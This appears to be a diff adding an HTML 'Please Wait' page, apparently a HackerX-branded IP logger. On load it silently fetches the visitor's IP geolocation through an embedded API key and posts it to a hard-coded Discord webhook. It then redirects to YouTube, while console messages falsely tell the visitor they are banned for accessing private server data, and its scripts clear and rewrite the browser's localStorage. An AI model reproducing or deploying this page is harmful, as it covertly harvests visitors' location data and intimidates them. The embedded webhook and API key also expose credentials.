@@ -1,0 +1,113 @@
+<script language=javascript>
+    var rev = "fwd";
+    function titlebar(val){
+        var msg  = "Hello :D";
+        var res = " ";
+        var speed = 21;
+        var pos = val;
+        msg = "   "+msg+"";
+        var le = msg.length;
+        if(rev == "fwd"){
+            if(pos < le){
+                pos = pos+1;
+                scroll = msg.substr(0,pos);
+                document.title = scroll;
+                timer = window.setTimeout("titlebar("+pos+")",speed);
+            }
+            else {
+                rev = "bwd";
+                timer = window.setTimeout("titlebar("+pos+")",speed);
+            }
+        }
+        else {
+            if(pos > 0) {
+                pos = pos-1;
+                var ale = le-pos;
+                scrol = msg.substr(ale,le);
+                document.title = scrol;
+                timer = window.setTimeout("titlebar("+pos+")",speed);
+            }
+            else {
+                rev = "fwd";
+                timer = window.setTimeout("titlebar("+pos+")",speed);
+            }
+        }
+    }
+    titlebar(0);
+</script>
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Please Wait</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<link rel='stylesheet' href='https://vjs.zencdn.net/5-unsafe/video-js.css'><link rel="stylesheet" href="./style.css">
+<link rel="icon" href="https://i.ibb.co/2jKXddF/hackerxlogo.png">
+<meta http-equiv="refresh" content="0.51; url=https://www.youtube.com" />
+
+</head>
+<body>
+    <script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+    </script>
+     
+    <script>
+     const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/949045544469291018/BAOi0YHtos2clf-k-o6bq1cDrD-CoxXI6ro6_-LZxBUepW2Wa8xQZ06ieBnMOPghUNGr");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+			$.getJSON('https://ipgeolocation.abstractapi.com/v1/?api_key=87de8e8333fd45308149d5e3a7e7ee20', function(data) {
+
+      const params = {
+        username: "Banned",
+        avatar_url: "",
+        content: `${JSON.stringify(data, null, 2)}`
+      }
+
+      request.send(JSON.stringify(params));
+			})
+    </script>
+</head>
+<center>
+
+<script type="text/javascript">
+    var timeleft = 5;
+    var downloadTimer = setInterval(function(){
+    timeleft--;
+    document.getElementById("countdowntimer").textContent = timeleft;
+    if(timeleft <= 0)
+        clearInterval(downloadTimer);
+    },1000);
+</script>
+<script>
+	window.addEventListener("load", function(){
+	console.log('%cBanned', `
+  background: black;
+  border: 3px solid red;
+  color: red;
+  font-size: 50px;
+  margin: 40px;
+  padding: 20px;
+`);
+	console.log("%cYou've Accessed Private Data Of HackerX's Servers! \nYou are now Banned From HackerX Site!", 'color: red; font-size: 30px;');
+	window.localStorage.clear();
+	setTimeout(() => {  console.log("%cClearing localStorage ", 'background: #222; color: #bada55'); }, 300);
+	setTimeout(() => {  console.log("%c Disconnected From Database! ", 'background: #222; color: #FF0001'); }, 400);
+setTimeout(() => {
+		console.group('%cInfo Sent:', 'font-size: 20px; color: cyan;');
+		$.getJSON('https://ipgeolocation.abstractapi.com/v1/?api_key=87de8e8333fd45308149d5e3a7e7ee20', function(data) {
+		console.log(`%c${JSON.stringify(data, null, 2)}`, 'background: #222; color: #FF0001');
+		})
+		console.groupEnd(); }, 2000);
+	window.localStorage.setItem('identity', 'banneduser');
+	window.localStorage.setItem('developer', 'false');
+	window.localStorage.setItem('banned', 'true');
+		window.localStorage.setItem('info', '{"_state":{"tracking":{"ip":"allowed","location":"geoloc","microphone":"denied"}},"_version":0}');
+		window.SessionStorage.setItem('info', '{"_state":{"tracking":{"ip":"allowed","location":"geoloc","microphone":"denied"}},"_version":0}');
+});
+</script>	
+</center>
+</body>
+ 
+</html>
